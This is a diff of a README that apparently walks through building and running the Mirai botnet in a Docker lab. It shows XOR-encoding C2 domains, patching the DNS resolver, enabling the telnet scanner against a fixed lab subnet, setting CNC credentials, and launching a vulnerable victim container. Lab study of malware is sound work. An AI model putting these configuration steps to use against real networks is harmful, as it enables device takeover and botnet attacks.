@@ -35,24 +35,36 @@ $ docker compose build
 
 ## 04. Encrypt your domain
 ```
-$ docker compose run compile ./enc.sh string cnc.mirai.com
-XOR'ing 14 bytes of data...
-\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
-```
-```
-$ docker compose run compile ./enc.sh string report.mirai.com
+$ docker compose run compile ./enc.sh string cnc.changeme.com
 XOR'ing 17 bytes of data...
-\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
+\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22
+```
+```
+$ docker compose run compile ./enc.sh string report.changeme.com
+XOR'ing 20 bytes of data...
+\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22
 ```
 
+<!--
+```
+$ docker compose run compile ./enc.sh string cnc-10-20-0-10.nip.io
+XOR'ing 22 bytes of data...
+\x41\x4C\x41\x0F\x13\x12\x0F\x10\x12\x0F\x12\x0F\x13\x12\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
+```
+```
+$ docker compose run compile ./enc.sh string report-10-20-0-10.nip.io
+XOR'ing 25 bytes of data...
+\x50\x47\x52\x4D\x50\x56\x0F\x13\x12\x0F\x10\x12\x0F\x12\x0F\x13\x12\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
+```
+-->
 
 ## 05. Configure bot
 Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
 ```c
-add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 30); // cnc.mirai.com
+add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
 add_entry(TABLE_CNC_PORT, "\x22\x35", 2); // 23
 
-add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 29); // report.mirai.com
+add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
 add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2); // 48101
 ```
 
@@ -64,13 +76,34 @@ struct resolv_entries *resolv_lookup(char *domain)
 
     util_zero(&addr, sizeof (struct sockaddr_in));
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1); // <-- here!
+    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8); // <-- here!
     addr.sin_port = htons(53);
 
     // ...
 }
 ```
 
+If you want to enable scanner in debug mode, comment out the following two lines in [./src/mirai/bot/main.c](./src/mirai/bot/main.c).
+```c
+// #ifndef DEBUG // <-- comment here!
+#ifdef MIRAI_TELNET
+    scanner_init();
+#endif
+// #endif // <-- comment here!
+```
+
+Edit get_random_ip() function in [./src/mirai/bot/scanner.c](./src/mirai/bot/scanner.c).
+```c
+static ipv4_t get_random_ip(void)
+{
+    uint32_t tmp;
+    uint8_t o1, o2, o3, o4;
+
+    // comment do-while loop
+
+    return INET_ADDR(172, 20, 0, rand_next() & 0xff); // fixed ip range
+}
+```
 
 ## 06. Configure CNC
 Edit database config in [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
@@ -88,7 +121,7 @@ headerb, err := ioutil.ReadFile("/home/user/src/mirai/prompt.txt") // <-- here!
 
 Edit CNC user in [./src/scripts/db.sql](./src/scripts/db.sql)
 ```sql
--- CREATE DATABASE mirai; --- comment!
+-- CREATE DATABASE mirai; --- comment here!
 
 CREATE TABLE `history` (
 
@@ -101,15 +134,25 @@ INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 3
 ```
 
 
-## 07. Compile bot and CNC
+## 07. Compile everything
 ```
 $ docker compose run compile ./build.sh
 ```
 
+Debug bot only:
+```
+$ docker compose run compile ./debug.sh
+```
 
-## 08. Run CNC and database server
+
+## 08. Run CNC, loader, scanListen and mariadb
 ```
 $ docker compose up
+```
+
+## 09. Connect to CNC server
+```
+$ docker compose exec cnc telnet 127.0.0.1
 ```
 ```
 $ telnet 127.0.0.1
@@ -143,18 +186,21 @@ mysql -h mariadb -P 3306 -u"user" -p"this-is-password!"
 use mirai;
 select * from users;
 ```
-
 ```
 $ docker compose up mariadb -d
 $ docker compose run compile sudo ./src/mirai/debug/cnc
 ```
-```
-$ docker compose exec compile telnet 127.0.0.1
-```
 -->
 
 
-## 09. Run bot
+## 10. Run victim (insecure telnet server)
 ```
-$ docker compose run compile ./src/mirai/debug/mirai.dbg
+$ docker compose run victim
+```
+
+
+## 10. Run bot
+It will scan and report victims.
+```
+$ docker compose run bot /home/user/src/mirai/debug/mirai.dbg
 ```
